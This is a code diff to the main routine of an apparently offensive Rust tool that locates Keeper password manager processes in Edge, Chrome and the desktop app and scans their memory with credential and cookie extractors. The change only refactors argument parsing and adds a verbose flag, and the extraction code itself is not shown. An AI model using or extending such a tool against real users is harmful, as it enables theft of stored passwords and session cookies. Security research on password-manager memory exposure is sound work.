@@ -1,26 +1,28 @@
-use cli::{get_choice, Application};
+use cli::{parse_args, Application};
 
 fn main() -> std::io::Result<()> {
-    let (process_id, extractors) = match get_choice() {
+    let args = parse_args();
+
+    let (process_id, extractors) = match args.application {
         Application::Msedge => {
             println!("[i] Scanning Microsoft Edge...");
             println!("[i] Getting target PID");
             let pid = enumerate::get_program_pid("msedge.exe", Some(r"--type=renderer --extension-process"));
-            let extractors: &[fn(&str)] = &[extract::extract_credentials_chrome];
+            let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
             (pid, extractors)
         }
         Application::Chrome => {
             println!("[i] Scanning Google Chrome...");
             println!("[i] Getting target PID");
             let pid = enumerate::get_program_pid("chrome.exe", Some(r"--type=renderer --extension-process"));
-            let extractors: &[fn(&str)] = &[extract::extract_credentials_chrome];
+            let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
             (pid, extractors)
         }
         Application::Desktop => {
             println!("[i] Scanning on the Desktop...");
             println!("[i] Getting target PID");
             let pid = enumerate::get_program_pid("keeperpasswordmanager.exe", Some(r"--renderer-client-id=4"));
-            let extractors: &[fn(&str)] = &[
+            let extractors: &[fn(&str, bool)] = &[
                 extract::extract_credentials_chrome,
                 extract::extract_cookies,
             ];
@@ -31,7 +33,7 @@ fn main() -> std::io::Result<()> {
     if let Some(pid) = process_id {
         println!("[+] Keeper target PID Found: {}", pid);
         println!("[i] Iterating over memory");
-        let _ = dump::iterate_over_mem(pid.as_u32(), extractors);
+        let _ = dump::iterate_over_mem(pid.as_u32(), extractors, args.verbose);
     } else {
         println!("[-] Could not find target PID");
     }
